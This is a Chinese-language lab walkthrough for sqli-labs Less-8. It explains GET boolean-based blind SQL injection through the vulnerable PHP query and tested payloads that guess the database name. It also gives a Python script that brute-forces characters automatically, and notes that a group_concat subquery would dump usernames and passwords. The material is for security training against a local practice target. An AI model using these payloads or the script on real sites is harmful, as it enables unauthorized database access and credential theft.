# Less-8

> [总目录](README.md) ｜ [基础知识](00-基础知识.md) ｜ [完整版合集](Less-1-20-全合集.md)

| 项目 | 内容 |
|---|---|
| **注入类型** | GET · 布尔盲注 |
| **闭合方式** | `'` |
| **注释符** | `--+ · GET 地址栏直接可用` |
| **成败信号** | You are in 在不在 |
| **一句话** | 只看「You are in」在不在 |
| **核心 payload** | `?id=1' and length(database())=8--+` |

---

**GET · 布尔盲注 · 单引号**

### 源码

```php
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
if($row) { echo 'You are in...........'; }
else     { /* 什么都不输出 */ }
```

### 特点

页面只有两种状态：
- 条件为真 → 出现 `You are in...........`
- 条件为假 → 那句话消失

没有回显位，也没有报错，只能靠「有没有这句话」来判断。这叫**布尔盲注**。

### 通关 payload（实测）

**① 确认布尔条件生效**
```
?id=1' and 1=1--+   →  You are in...........
?id=1' and 1=2--+   →  （无）
```

**② 猜库名长度**
```
?id=1' and length(database())=8--+   →  You are in...........   ✓ 长度是 8
```

**③ 逐字符猜库名**
```
?id=1' and substr(database(),1,1)='s'--+        →  有回显  ✓
?id=1' and ascii(substr(database(),1,1))=115--+ →  有回显  ✓
```

**④ 完整爆破解法**

手工猜 8 个字符还能忍，猜 13 个用户的密码就不可能手搓了。写脚本自动跑：

```python
import requests

url = "http://localhost/sqli-labs-master/Less-8/"
chars = "abcdefghijklmnopqrstuvwxyz0123456789@._-"
result = ""

for pos in range(1, 30):
    for ch in chars:
        payload = f"?id=1' and substr(database(),{pos},1)='{ch}'--+"
        r = requests.get(url + payload)
        if "You are in" in r.text:
            result += ch
            print(result)
            break
    else:
        break          # 整个字符集都没匹配上 → 字符串结束了
print("结果:", result)
```

把这行换成 `(select group_concat(username,0x3a,password) from users)` 就能拖库。

---

[← Less-7](Less-07.md) ｜ [返回目录](README.md) ｜ [Less-9 →](Less-09.md)